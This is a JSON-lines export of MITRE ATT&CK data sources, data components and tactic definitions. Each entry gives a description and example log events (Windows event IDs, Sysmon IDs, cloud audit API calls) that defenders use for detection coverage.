{"name":"Group: Group Modification","ID":null,"description":"Changes made to a group, such as membership, name, or permissions (ex: Windows EID 4728 or 4732, AWS IAM UpdateGroup)","collection layers":null,"platforms":null,"created":"20 October 2021","modified":null,"type":"datacomponent","version":"1.0","url":null,"contributors":null}
{"name":"Image","ID":"DS0007","description":"A single file used to deploy a virtual machine/bootable disk into an on-premise or third-party cloud environment(Citation: Microsoft Image)(Citation: Amazon AMI)","collection layers":"Cloud Control Plane","platforms":"IaaS","created":"20 October 2021","modified":null,"type":"datasource","version":"1.0","url":"https://attack.mitre.org/datasources/DS0007","contributors":"Center for Threat-Informed Defense (CTID)"}
{"name":"Image: Image Creation","ID":null,"description":"Initial construction of a virtual machine image (ex: Azure Compute Service Images PUT)","collection layers":null,"platforms":null,"created":"20 October 2021","modified":null,"type":"datacomponent","version":"1.0","url":null,"contributors":null}
{"name":"Image: Image Deletion","ID":null,"description":"Removal of a virtual machine image (ex: Azure Compute Service Images DELETE)","collection layers":null,"platforms":null,"created":"20 October 2021","modified":null,"type":"datacomponent","version":"1.0","url":null,"contributors":null}
{"name":"Image: Image Metadata","ID":null,"description":"Contextual data about a virtual machine image such as name, resource group, state, or type","collection layers":null,"platforms":null,"created":"20 October 2021","modified":null,"type":"datacomponent","version":"1.0","url":null,"contributors":null}
{"name":"Image: Image Modification","ID":null,"description":"Changes made to a virtual machine image, including setting and/or control data (ex: Azure Compute Service Images PATCH)","collection layers":null,"platforms":null,"created":"20 October 2021","modified":null,"type":"datacomponent","version":"1.0","url":null,"contributors":null}
{"name":"Instance","ID":"DS0030","description":"A virtual server environment which runs workloads, hosted on-premise or by third-party cloud providers(Citation: Amazon VM)(Citation: Google VM)","collection layers":"Cloud Control Plane","platforms":"IaaS","created":"20 October 2021","modified":null,"type":"datasource","version":"1.0","url":"https://attack.mitre.org/datasources/DS0030","contributors":null}
{"name":"Instance: Instance Creation","ID":null,"description":"Initial construction of a new instance (ex: instance.insert within GCP Audit Logs)","collection layers":null,"platforms":null,"created":"20 October 2021","modified":null,"type":"datacomponent","version":"1.0","url":null,"contributors":null}
{"name":"Instance: Instance Deletion","ID":null,"description":"Removal of an instance (ex: instance.delete within GCP Audit Logs)","collection layers":null,"platforms":null,"created":"20 October 2021","modified":null,"type":"datacomponent","version":"1.0","url":null,"contributors":null}
{"name":"Instance: Instance Enumeration","ID":null,"description":"An extracted list of instances within a cloud environment (ex: instance.list within GCP Audit Logs)","collection layers":null,"platforms":null,"created":"20 October 2021","modified":null,"type":"datacomponent","version":"1.0","url":null,"contributors":null}
{"name":"Instance: Instance Metadata","ID":null,"description":"Contextual data about an instance and activity around it such as name, type, or status","collection layers":null,"platforms":null,"created":"20 October 2021","modified":null,"type":"datacomponent","version":"1.0","url":null,"contributors":null}
{"name":"Instance: Instance Modification","ID":null,"description":"Changes made to an instance, including its settings and/or control data (ex: instance.addResourcePolicies or instances.setMetadata within GCP Audit Logs)","collection layers":null,"platforms":null,"created":"20 October 2021","modified":null,"type":"datacomponent","version":"1.0","url":null,"contributors":null}
{"name":"Instance: Instance Start","ID":null,"description":"Activation or invocation of an instance (ex: instance.start within GCP Audit Logs)","collection layers":null,"platforms":null,"created":"20 October 2021","modified":null,"type":"datacomponent","version":"1.0","url":null,"contributors":null}
{"name":"Instance: Instance Stop","ID":null,"description":"Deactivation or stoppage of an instance (ex: instance.stop within GCP Audit Logs)","collection layers":null,"platforms":null,"created":"20 October 2021","modified":null,"type":"datacomponent","version":"1.0","url":null,"contributors":null}
{"name":"Internet Scan","ID":"DS0035","description":"Information obtained (commonly via active network traffic probes or web crawling) regarding various types of resources and servers connected to the public Internet","collection layers":"OSINT","platforms":"PRE","created":"20 October 2021","modified":null,"type":"datasource","version":"1.0","url":"https://attack.mitre.org/datasources/DS0035","contributors":null}
{"name":"Internet Scan: Response Content","ID":null,"description":"Logged network traffic in response to a scan showing both protocol header and body values","collection layers":null,"platforms":null,"created":"20 October 2021","modified":null,"type":"datacomponent","version":"1.0","url":null,"contributors":null}
{"name":"Internet Scan: Response Metadata","ID":null,"description":"Contextual data about an Internet-facing resource gathered from a scan, such as running services or ports","collection layers":null,"platforms":null,"created":"20 October 2021","modified":null,"type":"datacomponent","version":"1.0","url":null,"contributors":null}
{"name":"Kernel","ID":"DS0008","description":"A computer program, at the core of a computer OS, that resides in memory and facilitates interactions between hardware and software components(Citation: STIG Audit Kernel Modules)(Citation: Init Man Page)","collection layers":"Host","platforms":"Linux, macOS","created":"20 October 2021","modified":null,"type":"datasource","version":"1.0","url":"https://attack.mitre.org/datasources/DS0008","contributors":"Center for Threat-Informed Defense (CTID)"}
{"name":"Kernel: Kernel Module Load","ID":null,"description":"An object file that contains code to extend the running kernel of an OS, typically used to add support for new hardware (as device drivers) and/or filesystems, or for adding system calls","collection layers":null,"platforms":null,"created":"20 October 2021","modified":null,"type":"datacomponent","version":"1.0","url":null,"contributors":null}
{"name":"Logon Session","ID":"DS0028","description":"Logon occurring on a system or resource (local, domain, or cloud) to which a user/device is gaining access after successful authentication and authorization(Citation: Microsoft Audit Logon Events)","collection layers":"Cloud Control Plane, Host, Network","platforms":"Azure AD, Google Workspace, IaaS, Linux, Office 365, SaaS, Windows, macOS","created":"20 October 2021","modified":null,"type":"datasource","version":"1.1","url":"https://attack.mitre.org/datasources/DS0028","contributors":"Center for Threat-Informed Defense (CTID)"}
{"name":"Logon Session: Logon Session Creation","ID":null,"description":"Initial construction of a successful new user logon following an authentication attempt. (e.g. Windows EID 4624, /var/log/utmp, or /var/log/wmtp)","collection layers":null,"platforms":null,"created":"20 October 2021","modified":null,"type":"datacomponent","version":"1.1","url":null,"contributors":null}
{"name":"Logon Session: Logon Session Metadata","ID":null,"description":"Contextual data about a logon session, such as username, logon type, access tokens (security context, user SIDs, logon identifiers, and logon SID), and any activity associated within it","collection layers":null,"platforms":null,"created":"20 October 2021","modified":null,"type":"datacomponent","version":"1.0","url":null,"contributors":null}
{"name":"Malware Repository","ID":"DS0004","description":"Information obtained (via shared or submitted samples) regarding malicious software (droppers, backdoors, etc.) used by adversaries","collection layers":"OSINT","platforms":"PRE","created":"20 October 2021","modified":null,"type":"datasource","version":"1.1","url":"https://attack.mitre.org/datasources/DS0004","contributors":null}
{"name":"Malware Repository: Malware Content","ID":null,"description":"Code, strings, and other signatures that compromise a malicious payload","collection layers":null,"platforms":null,"created":"20 October 2021","modified":null,"type":"datacomponent","version":"1.1","url":null,"contributors":null}
{"name":"Malware Repository: Malware Metadata","ID":null,"description":"Contextual data about a malicious payload, such as compilation times, file hashes, as well as watermarks or other identifiable configuration information","collection layers":null,"platforms":null,"created":"20 October 2021","modified":null,"type":"datacomponent","version":"1.1","url":null,"contributors":null}
{"name":"Module","ID":"DS0011","description":"Executable files consisting of one or more shared classes and interfaces, such as portable executable (PE) format binaries/dynamic link libraries (DLL), executable and linkable format (ELF) binaries/shared libraries, and Mach-O format binaries/shared libraries(Citation: Microsoft LoadLibrary)(Citation: Microsoft Module Class)","collection layers":"Host","platforms":"Linux, Windows, macOS","created":"20 October 2021","modified":null,"type":"datasource","version":"1.0","url":"https://attack.mitre.org/datasources/DS0011","contributors":"Center for Threat-Informed Defense (CTID)"}
{"name":"Module: Module Load","ID":null,"description":"Attaching a module into the memory of a process/program, typically to access shared resources/features provided by the module (ex: Sysmon EID 7)","collection layers":null,"platforms":null,"created":"20 October 2021","modified":null,"type":"datacomponent","version":"1.0","url":null,"contributors":null}
{"name":"Named Pipe","ID":"DS0023","description":"Mechanisms that allow inter-process communication locally or over the network. A named pipe is usually found as a file and processes attach to it(Citation: Microsoft Named Pipes)","collection layers":"Host","platforms":"Linux, Windows, macOS","created":"20 October 2021","modified":null,"type":"datasource","version":"1.0","url":"https://attack.mitre.org/datasources/DS0023","contributors":"Center for Threat-Informed Defense (CTID)"}
{"name":"Named Pipe: Named Pipe Metadata","ID":null,"description":"Contextual data about a named pipe on a system, including pipe name and creating process (ex: Sysmon EIDs 17-18)","collection layers":null,"platforms":null,"created":"20 October 2021","modified":null,"type":"datacomponent","version":"1.0","url":null,"contributors":null}
{"name":"Network Share","ID":"DS0033","description":"A storage resource (typically a folder or drive) made available from one host to others using network protocols, such as Server Message Block (SMB) or Network File System (NFS)(Citation: Microsoft NFS Overview)","collection layers":"Host","platforms":"Linux, Windows, macOS","created":"20 October 2021","modified":null,"type":"datasource","version":"1.0","url":"https://attack.mitre.org/datasources/DS0033","contributors":"Center for Threat-Informed Defense (CTID)"}
{"name":"Network Share: Network Share Access","ID":null,"description":"Opening a network share, which makes the contents available to the requestor (ex: Windows EID 5140 or 5145)","collection layers":null,"platforms":null,"created":"20 October 2021","modified":null,"type":"datacomponent","version":"1.0","url":null,"contributors":null}
{"name":"Network Traffic","ID":"DS0029","description":"Data transmitted across a network (ex: Web, DNS, Mail, File, etc.), that is either summarized (ex: Netflow) and/or captured as raw data in an analyzable format (ex: PCAP)","collection layers":"Cloud Control Plane, Host, Network","platforms":"Android, IaaS, Linux, Windows, iOS, macOS","created":"20 October 2021","modified":null,"type":"datasource","version":"1.1","url":"https://attack.mitre.org/datasources/DS0029","contributors":"Center for Threat-Informed Defense (CTID); ExtraHop"}
{"name":"Network Traffic: Network Connection Creation","ID":null,"description":"Initial construction of a network connection, such as capturing socket information with a source/destination IP and port(s) (ex: Windows EID 5156, Sysmon EID 3, or Zeek conn.log)","collection layers":null,"platforms":null,"created":"20 October 2021","modified":null,"type":"datacomponent","version":"1.1","url":null,"contributors":null}
{"name":"Network Traffic: Network Traffic Content","ID":null,"description":"Logged network traffic data showing both protocol header and body values (ex: PCAP)","collection layers":null,"platforms":null,"created":"20 October 2021","modified":null,"type":"datacomponent","version":"1.0","url":null,"contributors":null}
{"name":"Network Traffic: Network Traffic Flow","ID":null,"description":"Summarized network packet data, with metrics, such as protocol headers and volume (ex: Netflow or Zeek http.log)","collection layers":null,"platforms":null,"created":"20 October 2021","modified":null,"type":"datacomponent","version":"1.0","url":null,"contributors":null}
{"name":"Persona","ID":"DS0021","description":"A malicious online profile representing a user commonly used by adversaries to social engineer or otherwise target victims","collection layers":"OSINT","platforms":"PRE","created":"20 October 2021","modified":null,"type":"datasource","version":"1.0","url":"https://attack.mitre.org/datasources/DS0021","contributors":null}
{"name":"Persona: Social Media","ID":null,"description":"Established, compromised, or otherwise acquired social media personas","collection layers":null,"platforms":null,"created":"20 October 2021","modified":null,"type":"datacomponent","version":"1.0","url":null,"contributors":null}
{"name":"Pod","ID":"DS0014","description":"A single unit of shared resources within a cluster, comprised of one or more containers(Citation: Kube Kubectl)(Citation: Kube Pod)","collection layers":"Container","platforms":"Containers","created":"20 October 2021","modified":null,"type":"datasource","version":"1.0","url":"https://attack.mitre.org/datasources/DS0014","contributors":"Center for Threat-Informed Defense (CTID)"}
{"name":"Pod: Pod Creation","ID":null,"description":"Initial construction of a new pod (ex: kubectl apply|run)","collection layers":null,"platforms":null,"created":"20 October 2021","modified":null,"type":"datacomponent","version":"1.0","url":null,"contributors":null}
{"name":"Pod: Pod Enumeration","ID":null,"description":"An extracted list of pods within a cluster (ex: kubectl get pods)","collection layers":null,"platforms":null,"created":"20 October 2021","modified":null,"type":"datacomponent","version":"1.0","url":null,"contributors":null}
{"name":"Pod: Pod Modification","ID":null,"description":"Changes made to a pod, including its settings and/or control data (ex: kubectl set|patch|edit)","collection layers":null,"platforms":null,"created":"20 October 2021","modified":null,"type":"datacomponent","version":"1.0","url":null,"contributors":null}
{"name":"Process","ID":"DS0009","description":"Instances of computer programs that are being executed by at least one thread. Processes have memory space for process executables, loaded modules (DLLs or shared libraries), and allocated memory regions containing everything from user input to application-specific data structures(Citation: Microsoft Processes and Threads)","collection layers":"Host","platforms":"Android, Linux, Windows, iOS, macOS","created":"20 October 2021","modified":null,"type":"datasource","version":"1.1","url":"https://attack.mitre.org/datasources/DS0009","contributors":"Center for Threat-Informed Defense (CTID)"}
{"name":"Process: OS API Execution","ID":null,"description":"Operating system function/method calls executed by a process","collection layers":null,"platforms":null,"created":"20 October 2021","modified":null,"type":"datacomponent","version":"1.0","url":null,"contributors":null}
{"name":"Process: Process Access","ID":null,"description":"Opening of a process by another process, typically to read memory of the target process (ex: Sysmon EID 10)","collection layers":null,"platforms":null,"created":"20 October 2021","modified":null,"type":"datacomponent","version":"1.0","url":null,"contributors":null}
{"name":"Process: Process Creation","ID":null,"description":"The initial construction of an executable managed by the OS, that may involve one or more tasks or threads. (e.g. Win EID 4688, Sysmon EID 1, cmd.exe > net use, etc.)","collection layers":null,"platforms":null,"created":"20 October 2021","modified":null,"type":"datacomponent","version":"1.1","url":null,"contributors":null}
{"name":"Process: Process Metadata","ID":null,"description":"Contextual data about a running process, which may include information such as environment variables, image name, user/owner, etc.","collection layers":null,"platforms":null,"created":"20 October 2021","modified":null,"type":"datacomponent","version":"1.0","url":null,"contributors":null}
{"name":"Process: Process Modification","ID":null,"description":"Changes made to a process, or its contents, typically to write and/or execute code in the memory of the target process (ex: Sysmon EID 8)","collection layers":null,"platforms":null,"created":"20 October 2021","modified":null,"type":"datacomponent","version":"1.0","url":null,"contributors":null}
{"name":"Process: Process Termination","ID":null,"description":"Exit of a running process (ex: Sysmon EID 5 or Windows EID 4689)","collection layers":null,"platforms":null,"created":"20 October 2021","modified":null,"type":"datacomponent","version":"1.0","url":null,"contributors":null}
{"name":"Scheduled Job","ID":"DS0003","description":"Automated tasks that can be executed at a specific time or on a recurring schedule running in the background (ex: Cron daemon, task scheduler, BITS)(Citation: Microsoft Tasks)","collection layers":"Container, Host","platforms":"Containers, Linux, Windows, macOS","created":"20 October 2021","modified":null,"type":"datasource","version":"1.0","url":"https://attack.mitre.org/datasources/DS0003","contributors":"Center for Threat-Informed Defense (CTID)"}
{"name":"Scheduled Job: Scheduled Job Creation","ID":null,"description":"Initial construction of a new scheduled job (ex: Windows EID 4698 or /var/log cron logs)","collection layers":null,"platforms":null,"created":"20 October 2021","modified":null,"type":"datacomponent","version":"1.0","url":null,"contributors":null}
{"name":"Scheduled Job: Scheduled Job Metadata","ID":null,"description":"Contextual data about a scheduled job, which may include information such as name, timing, command(s), etc.","collection layers":null,"platforms":null,"created":"20 October 2021","modified":null,"type":"datacomponent","version":"1.0","url":null,"contributors":null}
{"name":"Scheduled Job: Scheduled Job Modification","ID":null,"description":"Changes made to a scheduled job, such as modifications to the execution launch (ex: Windows EID 4702 or /var/log cron logs)","collection layers":null,"platforms":null,"created":"20 October 2021","modified":null,"type":"datacomponent","version":"1.0","url":null,"contributors":null}
{"name":"Script","ID":"DS0012","description":"A file or stream containing a list of commands, allowing them to be launched in sequence(Citation: Microsoft PowerShell Logging)(Citation: FireEye PowerShell Logging)(Citation: Microsoft AMSI)","collection layers":"Host","platforms":"Windows","created":"20 October 2021","modified":null,"type":"datasource","version":"1.1","url":"https://attack.mitre.org/datasources/DS0012","contributors":"Center for Threat-Informed Defense (CTID)"}
{"name":"Script: Script Execution","ID":null,"description":"The execution of a text file that contains code via the interpreter (e.g. Powershell, WMI, Windows EID 4104, etc.)","collection layers":null,"platforms":null,"created":"20 October 2021","modified":null,"type":"datacomponent","version":"1.1","url":null,"contributors":null}
{"name":"Sensor Health","ID":"DS0013","description":"Information from host telemetry providing insights about system status, errors, or other notable functional activity","collection layers":"Host","platforms":"Android, Linux, Windows, iOS, macOS","created":"20 October 2021","modified":null,"type":"datasource","version":"1.1","url":"https://attack.mitre.org/datasources/DS0013","contributors":"Center for Threat-Informed Defense (CTID)"}
{"name":"Sensor Health: Host Status","ID":null,"description":"Logging, messaging, and other artifacts highlighting the health of host sensors (ex: metrics, errors, and/or exceptions from logging applications)","collection layers":null,"platforms":null,"created":"20 October 2021","modified":null,"type":"datacomponent","version":"1.1","url":null,"contributors":null}
{"name":"Service","ID":"DS0019","description":"A computer process that is configured to execute continuously in the background and perform system tasks, in some cases before any user has logged in(Citation: Microsoft Services)(Citation: Linux Services Run Levels)","collection layers":"Host","platforms":"Linux, Windows, macOS","created":"20 October 2021","modified":null,"type":"datasource","version":"1.0","url":"https://attack.mitre.org/datasources/DS0019","contributors":"Center for Threat-Informed Defense (CTID)"}
{"name":"Service: Service Creation","ID":null,"description":"Initial construction of a new service/daemon (ex: Windows EID 4697 or /var/log daemon logs)","collection layers":null,"platforms":null,"created":"20 October 2021","modified":null,"type":"datacomponent","version":"1.0","url":null,"contributors":null}
{"name":"Service: Service Metadata","ID":null,"description":"Contextual data about a service/daemon, which may include information such as name, service executable, start type, etc.","collection layers":null,"platforms":null,"created":"20 October 2021","modified":null,"type":"datacomponent","version":"1.0","url":null,"contributors":null}
{"name":"Service: Service Modification","ID":null,"description":"Changes made to a service/daemon, such as changes to name, description, and/or start type (ex: Windows EID 7040 or /var/log daemon logs)","collection layers":null,"platforms":null,"created":"20 October 2021","modified":null,"type":"datacomponent","version":"1.0","url":null,"contributors":null}
{"name":"Snapshot","ID":"DS0020","description":"A point-in-time copy of cloud volumes (files, settings, etc.) that can be created and/or deployed in cloud environments(Citation: Microsoft Snapshot)(Citation: Amazon Snapshots)","collection layers":"Cloud Control Plane","platforms":"IaaS","created":"20 October 2021","modified":null,"type":"datasource","version":"1.0","url":"https://attack.mitre.org/datasources/DS0020","contributors":"Center for Threat-Informed Defense (CTID)"}
{"name":"Snapshot: Snapshot Creation","ID":null,"description":"Initial construction of a new snapshot (ex: AWS create-snapshot)","collection layers":null,"platforms":null,"created":"20 October 2021","modified":null,"type":"datacomponent","version":"1.0","url":null,"contributors":null}
{"name":"Snapshot: Snapshot Deletion","ID":null,"description":"Removal of a snapshot (ex: AWS delete-snapshot)","collection layers":null,"platforms":null,"created":"20 October 2021","modified":null,"type":"datacomponent","version":"1.0","url":null,"contributors":null}
{"name":"Snapshot: Snapshot Enumeration","ID":null,"description":"An extracted list of snapshops within a cloud environment (ex: AWS describe-snapshots)","collection layers":null,"platforms":null,"created":"20 October 2021","modified":null,"type":"datacomponent","version":"1.0","url":null,"contributors":null}
{"name":"Snapshot: Snapshot Metadata","ID":null,"description":"Contextual data about a snapshot, which may include information such as ID, type, and status","collection layers":null,"platforms":null,"created":"20 October 2021","modified":null,"type":"datacomponent","version":"1.0","url":null,"contributors":null}
{"name":"Snapshot: Snapshot Modification","ID":null,"description":"Changes made to a snapshop, such as metadata and control data (ex: AWS modify-snapshot-attribute)","collection layers":null,"platforms":null,"created":"20 October 2021","modified":null,"type":"datacomponent","version":"1.0","url":null,"contributors":null}
{"name":"User Account","ID":"DS0002","description":"A profile representing a user, device, service, or application used to authenticate and access resources","collection layers":"Cloud Control Plane, Container, Host","platforms":"Azure AD, Containers, Google Workspace, IaaS, Linux, Office 365, SaaS, Windows, macOS","created":"20 October 2021","modified":null,"type":"datasource","version":"1.1","url":"https://attack.mitre.org/datasources/DS0002","contributors":"Center for Threat-Informed Defense (CTID)"}
{"name":"User Account: User Account Authentication","ID":null,"description":"An attempt by a user to gain access to a network or computing resource, often by providing credentials (ex: Windows EID 4776 or /var/log/auth.log)","collection layers":null,"platforms":null,"created":"20 October 2021","modified":null,"type":"datacomponent","version":"1.1","url":null,"contributors":null}
{"name":"User Account: User Account Creation","ID":null,"description":"Initial construction of a new account (ex: Windows EID 4720 or /etc/passwd logs)","collection layers":null,"platforms":null,"created":"20 October 2021","modified":null,"type":"datacomponent","version":"1.0","url":null,"contributors":null}
{"name":"User Account: User Account Deletion","ID":null,"description":"Removal of an account (ex: Windows EID 4726 or /var/log access/authentication logs)","collection layers":null,"platforms":null,"created":"20 October 2021","modified":null,"type":"datacomponent","version":"1.0","url":null,"contributors":null}
{"name":"User Account: User Account Metadata","ID":null,"description":"Contextual data about an account, which may include a username, user ID, environmental data, etc.","collection layers":null,"platforms":null,"created":"20 October 2021","modified":null,"type":"datacomponent","version":"1.0","url":null,"contributors":null}
{"name":"User Account: User Account Modification","ID":null,"description":"Changes made to an account, such as permissions and/or membership in specific groups (ex: Windows EID 4738 or /var/log access/authentication logs)","collection layers":null,"platforms":null,"created":"20 October 2021","modified":null,"type":"datacomponent","version":"1.0","url":null,"contributors":null}
{"name":"Volume","ID":"DS0034","description":"Block object storage hosted on-premise or by third-party providers, typically made available to resources as virtualized hard drives(Citation: Amazon S3)(Citation: Azure Blob Storage)(Citation: Google Cloud Storage)","collection layers":"Cloud Control Plane, Host","platforms":"IaaS, Linux, Windows, macOS","created":"20 October 2021","modified":null,"type":"datasource","version":"1.0","url":"https://attack.mitre.org/datasources/DS0034","contributors":"Center for Threat-Informed Defense (CTID)"}
{"name":"Volume: Volume Creation","ID":null,"description":"Initial construction of a cloud volume (ex: AWS create-volume)","collection layers":null,"platforms":null,"created":"20 October 2021","modified":null,"type":"datacomponent","version":"1.0","url":null,"contributors":null}
{"name":"Volume: Volume Deletion","ID":null,"description":"Removal of a a cloud volume (ex: AWS delete-volume)","collection layers":null,"platforms":null,"created":"20 October 2021","modified":null,"type":"datacomponent","version":"1.0","url":null,"contributors":null}
{"name":"Volume: Volume Enumeration","ID":null,"description":"An extracted list of available volumes within a cloud environment (ex: AWS describe-volumes)","collection layers":null,"platforms":null,"created":"20 October 2021","modified":null,"type":"datacomponent","version":"1.0","url":null,"contributors":null}
{"name":"Volume: Volume Metadata","ID":null,"description":"Contextual data about a cloud volume and activity around it, such as id, type, state, and size","collection layers":null,"platforms":null,"created":"20 October 2021","modified":null,"type":"datacomponent","version":"1.0","url":null,"contributors":null}
{"name":"Volume: Volume Modification","ID":null,"description":"Changes made to a cloud volume, including its settings and control data (ex: AWS modify-volume)","collection layers":null,"platforms":null,"created":"20 October 2021","modified":null,"type":"datacomponent","version":"1.0","url":null,"contributors":null}
{"name":"WMI","ID":"DS0005","description":"The infrastructure for management data and operations that enables local and remote management of Windows personal computers and servers(Citation: Microsoft WMI System Classes)(Citation: Microsoft WMI Architecture)","collection layers":"Host","platforms":"Windows","created":"20 October 2021","modified":null,"type":"datasource","version":"1.0","url":"https://attack.mitre.org/datasources/DS0005","contributors":"Center for Threat-Informed Defense (CTID)"}
{"name":"WMI: WMI Creation","ID":null,"description":"Initial construction of a WMI object, such as a filter, consumer, subscription, binding, or provider (ex: Sysmon EIDs 19-21)","collection layers":null,"platforms":null,"created":"20 October 2021","modified":null,"type":"datacomponent","version":"1.0","url":null,"contributors":null}
{"name":"Web Credential","ID":"DS0006","description":"Credential material, such as session cookies or tokens, used to authenticate to web applications and services(Citation: Medium Authentication Tokens)(Citation: Auth0 Access Tokens)","collection layers":"Cloud Control Plane, Host","platforms":"Azure AD, Google Workspace, Linux, Office 365, SaaS, Windows, macOS","created":"20 October 2021","modified":null,"type":"datasource","version":"1.0","url":"https://attack.mitre.org/datasources/DS0006","contributors":null}
{"name":"Web Credential: Web Credential Creation","ID":null,"description":"Initial construction of new web credential material (ex: Windows EID 1200 or 4769)","collection layers":null,"platforms":null,"created":"20 October 2021","modified":null,"type":"datacomponent","version":"1.0","url":null,"contributors":null}
{"name":"Web Credential: Web Credential Usage","ID":null,"description":"An attempt by a user to gain access to a network or computing resource by providing web credentials (ex: Windows EID 1202)","collection layers":null,"platforms":null,"created":"20 October 2021","modified":null,"type":"datacomponent","version":"1.0","url":null,"contributors":null}
{"name":"Windows Registry","ID":"DS0024","description":"A Windows OS hierarchical database that stores much of the information and settings for software programs, hardware devices, user preferences, and operating-system configurations(Citation: Microsoft Registry)","collection layers":"Host","platforms":"Windows","created":"20 October 2021","modified":null,"type":"datasource","version":"1.0","url":"https://attack.mitre.org/datasources/DS0024","contributors":null}
{"name":"Windows Registry: Windows Registry Key Access","ID":null,"description":"Opening a Registry Key, typically to read the associated value (ex: Windows EID 4656)","collection layers":null,"platforms":null,"created":"20 October 2021","modified":null,"type":"datacomponent","version":"1.0","url":null,"contributors":null}
{"name":"Windows Registry: Windows Registry Key Creation","ID":null,"description":"Initial construction of a new Registry Key (ex: Windows EID 4656 or Sysmon EID 12)","collection layers":null,"platforms":null,"created":"20 October 2021","modified":null,"type":"datacomponent","version":"1.0","url":null,"contributors":null}
{"name":"Windows Registry: Windows Registry Key Deletion","ID":null,"description":"Removal of a Registry Key (ex: Windows EID 4658 or Sysmon EID 12)","collection layers":null,"platforms":null,"created":"20 October 2021","modified":null,"type":"datacomponent","version":"1.0","url":null,"contributors":null}
{"name":"Windows Registry: Windows Registry Key Modification","ID":null,"description":"Changes made to a Registry Key and/or Key value (ex: Windows EID 4657 or Sysmon EID 13|14)","collection layers":null,"platforms":null,"created":"20 October 2021","modified":null,"type":"datacomponent","version":"1.0","url":null,"contributors":null}
{"ID":"TA0009","name":"Collection","description":"The adversary is trying to gather data of interest to their goal.\n\nCollection consists of techniques adversaries may use to gather information and the sources information is collected from that are relevant to following through on the adversary's objectives. Frequently, the next goal after collecting data is to steal (exfiltrate) the data. Common target sources include various drive types, browsers, audio, video, and email. Common collection methods include capturing screenshots and keyboard input.","url":"https://attack.mitre.org/tactics/TA0009","created":"17 October 2018","last modified":"19 July 2019","version":"1.0"}
{"ID":"TA0011","name":"Command and Control","description":"The adversary is trying to communicate with compromised systems to control them.\n\nCommand and Control consists of techniques that adversaries may use to communicate with systems under their control within a victim network. Adversaries commonly attempt to mimic normal, expected traffic to avoid detection. There are many ways an adversary can establish command and control with various levels of stealth depending on the victim’s network structure and defenses.","url":"https://attack.mitre.org/tactics/TA0011","created":"17 October 2018","last modified":"19 July 2019","version":"1.0"}
{"ID":"TA0006","name":"Credential Access","description":"The adversary is trying to steal account names and passwords.\n\nCredential Access consists of techniques for stealing credentials like account names and passwords. Techniques used to get credentials include keylogging or credential dumping. Using legitimate credentials can give adversaries access to systems, make them harder to detect, and provide the opportunity to create more accounts to help achieve their goals.","url":"https://attack.mitre.org/tactics/TA0006","created":"17 October 2018","last modified":"19 July 2019","version":"1.0"}
{"ID":"TA0005","name":"Defense Evasion","description":"The adversary is trying to avoid being detected.\n\nDefense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses. ","url":"https://attack.mitre.org/tactics/TA0005","created":"17 October 2018","last modified":"19 July 2019","version":"1.0"}
{"ID":"TA0007","name":"Discovery","description":"The adversary is trying to figure out your environment.\n\nDiscovery consists of techniques an adversary may use to gain knowledge about the system and internal network. These techniques help adversaries observe the environment and orient themselves before deciding how to act. They also allow adversaries to explore what they can control and what’s around their entry point in order to discover how it could benefit their current objective. Native operating system tools are often used toward this post-compromise information-gathering objective. ","url":"https://attack.mitre.org/tactics/TA0007","created":"17 October 2018","last modified":"19 July 2019","version":"1.0"}
{"ID":"TA0002","name":"Execution","description":"The adversary is trying to run malicious code.\n\nExecution consists of techniques that result in adversary-controlled code running on a local or remote system. Techniques that run malicious code are often paired with techniques from all other tactics to achieve broader goals, like exploring a network or stealing data. For example, an adversary might use a remote access tool to run a PowerShell script that does Remote System Discovery. ","url":"https://attack.mitre.org/tactics/TA0002","created":"17 October 2018","last modified":"19 July 2019","version":"1.0"}
{"ID":"TA0010","name":"Exfiltration","description":"The adversary is trying to steal data.\n\nExfiltration consists of techniques that adversaries may use to steal data from your network. Once they’ve collected data, adversaries often package it to avoid detection while removing it. This can include compression and encryption. Techniques for getting data out of a target network typically include transferring it over their command and control channel or an alternate channel and may also include putting size limits on the transmission.","url":"https://attack.mitre.org/tactics/TA0010","created":"17 October 2018","last modified":"19 July 2019","version":"1.0"}
{"ID":"TA0040","name":"Impact","description":"The adversary is trying to manipulate, interrupt, or destroy your systems and data.\n \nImpact consists of techniques that adversaries use to disrupt availability or compromise integrity by manipulating business and operational processes. Techniques used for impact can include destroying or tampering with data. In some cases, business processes can look fine, but may have been altered to benefit the adversaries’ goals. These techniques might be used by adversaries to follow through on their end goal or to provide cover for a confidentiality breach.","url":"https://attack.mitre.org/tactics/TA0040","created":"14 March 2019","last modified":"25 July 2019","version":"1.0"}
{"ID":"TA0001","name":"Initial Access","description":"The adversary is trying to get into your network.\n\nInitial Access consists of techniques that use various entry vectors to gain their initial foothold within a network. Techniques used to gain a foothold include targeted spearphishing and exploiting weaknesses on public-facing web servers. Footholds gained through initial access may allow for continued access, like valid accounts and use of external remote services, or may be limited-use due to changing passwords.","url":"https://attack.mitre.org/tactics/TA0001","created":"17 October 2018","last modified":"19 July 2019","version":"1.0"}
{"ID":"TA0008","name":"Lateral Movement","description":"The adversary is trying to move through your environment.\n\nLateral Movement consists of techniques that adversaries use to enter and control remote systems on a network. Following through on their primary objective often requires exploring the network to find their target and subsequently gaining access to it. Reaching their objective often involves pivoting through multiple systems and accounts to gain. Adversaries might install their own remote access tools to accomplish Lateral Movement or use legitimate credentials with native network and operating system tools, which may be stealthier. ","url":"https://attack.mitre.org/tactics/TA0008","created":"17 October 2018","last modified":"19 July 2019","version":"1.0"}
{"ID":"TA0003","name":"Persistence","description":"The adversary is trying to maintain their foothold.\n\nPersistence consists of techniques that adversaries use to keep access to systems across restarts, changed credentials, and other interruptions that could cut off their access. Techniques used for persistence include any access, action, or configuration changes that let them maintain their foothold on systems, such as replacing or hijacking legitimate code or adding startup code. ","url":"https://attack.mitre.org/tactics/TA0003","created":"17 October 2018","last modified":"19 July 2019","version":"1.0"}
